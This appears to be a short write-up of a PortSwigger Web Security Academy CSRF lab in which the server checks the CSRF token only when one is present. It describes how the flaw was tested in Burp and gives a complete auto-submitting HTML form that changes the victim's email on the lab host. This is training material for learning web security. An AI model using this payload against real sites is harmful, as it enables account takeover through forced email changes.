Lab #3: CSRF where token validation depends on token being present

Target: change the viewer's email address


This lab's email change functionality is vulnerable to CSRF. 
It attempts to block CSRF attacks, but only checks the csrf token if available.

Hint: 
   
    To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

    You can log in to your own account using the following credentials: wiener:peter


Analysis:

  The change email page controls the csrf token, but only if the post request contains it. 
  using the burpsuit, repeat a change email post request with a modified csrf. Get validation error.
  repeat it without a csrf token. no error about the token.
  Then, use the below script:
    

    <html>
                    <body>
                        <form action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email" method="POST">
                            <input type="hidden" name="email" value="pwned@evil-user.net" />
                        </form>
                        <script>
                            document.forms[0].submit();
                        </script>
                    </body>
    </html>
